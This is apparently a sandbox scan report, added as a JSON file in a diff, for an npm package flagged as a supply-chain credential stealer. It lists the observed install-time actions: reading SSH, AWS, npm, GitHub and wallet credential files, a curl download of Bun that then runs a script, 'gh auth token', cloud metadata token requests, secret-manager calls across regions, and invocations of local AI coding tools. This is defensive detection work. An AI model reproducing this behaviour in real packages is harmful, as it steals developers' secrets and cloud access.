@@ -1,0 +1,375 @@
+{
+ "scan_id": "rh-20261106-162436-4ac58f",
+ "package": "leo-logger",
+ "version": "1.0.8",
+ "integrity": "sha512-PFgIzwbGxZcTC8u0dHW+KpG3GaxQ2dfcwlP3KQ/g/ZuXnQeChbtdM1N3YlYFZ8r/v8BaYoPPWYcgxfYcF+khJA==",
+ "verdict": "CRITICAL",
+ "reasons": [
+  "CRITICAL: honeytoken aws_access_key_id left the sandbox",
+  "CRITICAL: stolen token used against fake GitHub",
+  "CRITICAL: stolen token used against fake npm",
+  "REVIEW: used the machine's AI coding tool (claude)",
+  "REVIEW: used the machine's AI coding tool (codex)",
+  "REVIEW: used the machine's AI coding tool (copilot)",
+  "REVIEW: used the machine's AI coding tool (cursor-agent)",
+  "REVIEW: used the machine's AI coding tool (gemini)",
+  "REVIEW: used the machine's AI coding tool (q)",
+  "HIGH: read bait (/home/dev/.aws/credentials, /home/dev/.config/gh/hosts.yml, /home/dev/.env, /home/dev/.ethereum/keystore/wallet.json, /home/dev/.npmrc, /home/dev/.ssh/id_ed25519) and attempted network access",
+  "HIGH: spawned curl"
+ ],
+ "container_aware": false,
+ "seconds": 10.71,
+ "evidence": {
+  "exfil_matches": [
+   "aws_access_key_id"
+  ],
+  "machine_leaks": [],
+  "token_uses": [
+   "GitHub",
+   "npm"
+  ],
+  "bait_reads": [
+   "/home/dev/.aws/credentials",
+   "/home/dev/.config/gh/hosts.yml",
+   "/home/dev/.env",
+   "/home/dev/.ethereum/keystore/wallet.json",
+   "/home/dev/.npmrc",
+   "/home/dev/.ssh/id_ed25519"
+  ],
+  "connects": [
+   "169.254.169.254",
+   "api.github.com",
+   "github.com",
+   "graph.microsoft.com",
+   "metadata.google.internal",
+   "nodejs.org",
+   "registry.npmjs.org",
+   "secretsmanager.ap-northeast-1.amazonaws.com",
+   "secretsmanager.ap-northeast-2.amazonaws.com",
+   "secretsmanager.ap-northeast-3.amazonaws.com",
+   "secretsmanager.ap-south-1.amazonaws.com",
+   "secretsmanager.ap-southeast-1.amazonaws.com",
+   "secretsmanager.ap-southeast-2.amazonaws.com",
+   "secretsmanager.ca-central-1.amazonaws.com",
+   "secretsmanager.eu-central-1.amazonaws.com",
+   "secretsmanager.eu-north-1.amazonaws.com",
+   "secretsmanager.eu-west-1.amazonaws.com",
+   "secretsmanager.eu-west-2.amazonaws.com",
+   "secretsmanager.eu-west-3.amazonaws.com",
+   "secretsmanager.sa-east-1.amazonaws.com",
+   "secretsmanager.us-east-1.amazonaws.com",
+   "secretsmanager.us-east-2.amazonaws.com",
+   "secretsmanager.us-west-1.amazonaws.com",
+   "secretsmanager.us-west-2.amazonaws.com",
+   "ssm.ap-northeast-1.amazonaws.com",
+   "ssm.ap-northeast-2.amazonaws.com",
+   "ssm.ap-northeast-3.amazonaws.com",
+   "ssm.ap-south-1.amazonaws.com",
+   "ssm.ap-southeast-1.amazonaws.com",
+   "ssm.ap-southeast-2.amazonaws.com",
+   "ssm.ca-central-1.amazonaws.com",
+   "ssm.eu-central-1.amazonaws.com",
+   "ssm.eu-north-1.amazonaws.com",
+   "ssm.eu-west-1.amazonaws.com",
+   "ssm.eu-west-2.amazonaws.com",
+   "ssm.eu-west-3.amazonaws.com",
+   "ssm.sa-east-1.amazonaws.com",
+   "ssm.us-east-1.amazonaws.com",
+   "ssm.us-east-2.amazonaws.com",
+   "ssm.us-west-1.amazonaws.com",
+   "ssm.us-west-2.amazonaws.com",
+   "sts.us-east-1.amazonaws.com"
+  ],
+  "execs": [
+   [
+    [
+     "npm",
+     "rebuild",
+     "--foreground-scripts",
+     "--ignore-scripts=false"
+    ],
+    false
+   ],
+   [
+    [
+     "node",
+     "/usr/local/bin/npm",
+     "rebuild",
+     "--foreground-scripts",
+     "--ignore-scripts=false"
+    ],
+    false
+   ],
+   [
+    [
+     "sh",
+     "-c",
+     "node-gyp rebuild"
+    ],
+    true
+   ],
+   [
+    [
+     "node-gyp",
+     "rebuild"
+    ],
+    true
+   ],
+   [
+    [
+     "sh",
+     "/usr/local/lib/node_modules/npm/node_modules/@npmcli/run-script/lib/node-gyp-bin/node-gyp",
+     "rebuild"
+    ],
+    true
+   ],
+   [
+    [
+     "node",
+     "/usr/local/lib/node_modules/npm/node_modules/node-gyp/bin/node-gyp.js",
+     "rebuild"
+    ],
+    true
+   ],
+   [
+    [
+     "python3",
+     "-c",
+     "import sys; sys.stdout.buffer.write(sys.executable.encode('utf-8'));"
+    ],
+    true
+   ],
+   [
+    [
+     "/usr/bin/python3",
+     "-c"
+    ],
+    true
+   ],
+   [
+    [
+     "node",
+     "/work/.rh/load.js",
+     "leo-logger"
+    ],
+    false
+   ],
+   [
+    [
+     "/usr/local/bin/node",
+     "/work/.rh/exercise.js",
+     "leo-logger"
+    ],
+    false
+   ],
+   [
+    [
+     "/bin/sh",
+     "-c",
+     "curl -sSL \"https://github.com/oven-sh/bun/releases/download/bun-v1.3.13/bun-linux-x64-baseline.zip\" -o \"/tmp/b-AGA2Yp/b.zip\""
+    ],
+    false
+   ],
+   [
+    [
+     "curl",
+     "-sSL",
+     "https://github.com/oven-sh/bun/releases/download/bun-v1.3.13/bun-linux-x64-baseline.zip",
+     "-o",
+     "/tmp/b-AGA2Yp/b.zip"
+    ],
+    false
+   ],
+   [
+    [
+     "/bin/sh",
+     "-c",
+     "unzip -j -o \"/tmp/b-AGA2Yp/b.zip\" -d \"/tmp/b-AGA2Yp\""
+    ],
+    false
+   ],
+   [
+    [
+     "unzip",
+     "-j",
+     "-o",
+     "/tmp/b-AGA2Yp/b.zip",
+     "-d",
+     "/tmp/b-AGA2Yp"
+    ],
+    false
+   ],
+   [
+    [
+     "/bin/sh",
+     "-c",
+     "\"/tmp/b-AGA2Yp/bun\" run \"/tmp/pi8tsfv06c9.js\""
+    ],
+    false
+   ],
+   [
+    [
+     "/tmp/b-AGA2Yp/bun",
+     "run",
+     "/tmp/pi8tsfv06c9.js"
+    ],
+    false
+   ],
+   [
+    [
+     "/bin/sh",
+     "-c",
+     "hostname"
+    ],
+    false
+   ],
+   [
+    [
+     "hostname"
+    ],
+    false
+   ],
+   [
+    [
+     "/bin/sh",
+     "-c",
+     "gh auth token"
+    ],
+    false
+   ]
+  ],
+  "writes": [
+   "/home/dev/.bun/install/cache/@t@/.79edc9635ffeb5df-00000000..pile",
+   "/home/dev/.bun/install/cache/@t@/9bb57a4442c9ac69.pile"
+  ],
+  "incomplete": [],
+  "deadline_killed": false,
+  "load_hang": false,
+  "probe_flags": [],
+  "ai_tool_calls": [
+   "claude",
+   "codex",
+   "copilot",
+   "cursor-agent",
+   "gemini",
+   "q"
+  ],
+  "exfil_to": {
+   "aws_access_key_id": [
+    "secretsmanager.ap-northeast-1.amazonaws.com",
+    "secretsmanager.ap-northeast-2.amazonaws.com",
+    "secretsmanager.ap-northeast-3.amazonaws.com",
+    "secretsmanager.ap-south-1.amazonaws.com",
+    "secretsmanager.ap-southeast-1.amazonaws.com",
+    "secretsmanager.ap-southeast-2.amazonaws.com",
+    "secretsmanager.ca-central-1.amazonaws.com",
+    "secretsmanager.eu-central-1.amazonaws.com",
+    "secretsmanager.eu-north-1.amazonaws.com",
+    "secretsmanager.eu-west-1.amazonaws.com",
+    "secretsmanager.eu-west-2.amazonaws.com",
+    "secretsmanager.eu-west-3.amazonaws.com",
+    "secretsmanager.sa-east-1.amazonaws.com",
+    "secretsmanager.us-east-1.amazonaws.com",
+    "secretsmanager.us-east-2.amazonaws.com",
+    "secretsmanager.us-west-1.amazonaws.com",
+    "secretsmanager.us-west-2.amazonaws.com",
+    "ssm.ap-northeast-1.amazonaws.com",
+    "ssm.ap-northeast-2.amazonaws.com",
+    "ssm.ap-northeast-3.amazonaws.com",
+    "ssm.ap-south-1.amazonaws.com",
+    "ssm.ap-southeast-1.amazonaws.com",
+    "ssm.ap-southeast-2.amazonaws.com",
+    "ssm.ca-central-1.amazonaws.com",
+    "ssm.eu-central-1.amazonaws.com",
+    "ssm.eu-north-1.amazonaws.com",
+    "ssm.eu-west-1.amazonaws.com",
+    "ssm.eu-west-2.amazonaws.com",
+    "ssm.eu-west-3.amazonaws.com",
+    "ssm.sa-east-1.amazonaws.com",
+    "ssm.us-east-1.amazonaws.com",
+    "ssm.us-east-2.amazonaws.com",
+    "ssm.us-west-1.amazonaws.com",
+    "ssm.us-west-2.amazonaws.com",
+    "sts.us-east-1.amazonaws.com"
+   ]
+  },
+  "http_requests": [
+   "nodejs.org GET /download/release/v24.22.2/node-v24.22.2-headers.tar.gz",
+   "github.com GET /oven-sh/bun/releases/download/bun-v1.3.13/bun-linux-x64-baseline.zip",
+   "api.github.com GET /search/commits?q=RevokeAndItGoesKaboom&sort=author-date&order=desc&per_page=50",
+   "api.github.com GET /user",
+   "api.github.com GET /user/orgs",
+   "api.github.com GET /search/commits?q=TheBeautifulSandsOfTime&sort=author-date&order=desc",
+   "api.github.com GET /user",
+   "api.github.com GET /user/orgs",
+   "registry.npmjs.org GET /-/npm/v1/tokens",
+   "registry.npmjs.org GET /-/npm/v1/tokens",
+   "169.254.169.254 GET /metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net",
+   "169.254.169.254 GET /metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com",
+   "sts.us-east-1.amazonaws.com POST /",
+   "ssm.us-east-1.amazonaws.com POST /",
+   "ssm.us-east-2.amazonaws.com POST /",
+   "ssm.us-west-1.amazonaws.com POST /",
+   "ssm.us-west-2.amazonaws.com POST /",
+   "ssm.ap-northeast-1.amazonaws.com POST /",
+   "ssm.ap-northeast-2.amazonaws.com POST /",
+   "ssm.ap-northeast-3.amazonaws.com POST /",
+   "ssm.ap-south-1.amazonaws.com POST /",
+   "ssm.ap-southeast-1.amazonaws.com POST /",
+   "ssm.ap-southeast-2.amazonaws.com POST /",
+   "ssm.ca-central-1.amazonaws.com POST /",
+   "ssm.eu-central-1.amazonaws.com POST /",
+   "ssm.eu-north-1.amazonaws.com POST /",
+   "ssm.eu-west-1.amazonaws.com POST /",
+   "ssm.eu-west-2.amazonaws.com POST /",
+   "ssm.eu-west-3.amazonaws.com POST /",
+   "ssm.sa-east-1.amazonaws.com POST /",
+   "sts.us-east-1.amazonaws.com POST /",
+   "secretsmanager.us-east-1.amazonaws.com POST /",
+   "secretsmanager.us-east-2.amazonaws.com POST /",
+   "secretsmanager.us-west-1.amazonaws.com POST /",
+   "secretsmanager.us-west-2.amazonaws.com POST /",
+   "secretsmanager.ap-northeast-1.amazonaws.com POST /",
+   "secretsmanager.ap-northeast-2.amazonaws.com POST /",
+   "secretsmanager.ap-northeast-3.amazonaws.com POST /",
+   "secretsmanager.ap-south-1.amazonaws.com POST /",
+   "secretsmanager.ap-southeast-1.amazonaws.com POST /",
+   "secretsmanager.ap-southeast-2.amazonaws.com POST /",
+   "secretsmanager.ca-central-1.amazonaws.com POST /",
+   "secretsmanager.eu-central-1.amazonaws.com POST /",
+   "secretsmanager.eu-north-1.amazonaws.com POST /",
+   "secretsmanager.eu-west-1.amazonaws.com POST /",
+   "secretsmanager.eu-west-2.amazonaws.com POST /",
+   "secretsmanager.eu-west-3.amazonaws.com POST /",
+   "secretsmanager.sa-east-1.amazonaws.com POST /",
+   "169.254.169.254 PUT /latest/api/token",
+   "sts.us-east-1.amazonaws.com POST /",
+   "api.github.com GET /user",
+   "169.254.169.254 GET /metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com",
+   "graph.microsoft.com GET /v1.0/me",
+   "sts.us-east-1.amazonaws.com POST /",
+   "metadata.google.internal GET /computeMetadata/v1/instance/service-accounts/default/token?scopes=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcloud-platform"
+  ],
+  "skill_root": "",
+  "stats_count": 3459
+ },
+ "sandbox": {
+  "deadline_killed": false,
+  "exit_code": 0,
+  "errors": [],
+  "seconds": 9.28,
+  "syscall_lines": 75385,
+  "unparsed": 2,
+  "sinkhole_records": 187,
+  "dependencies": "2 dependencies fetched"
+ },
+ "microvm": null,
+ "manifest": {
+  "scripts": {},
+  "dependencies": [
+   "bun",
+   "lodash"
+  ]
+ },
+ "agent": null
+}
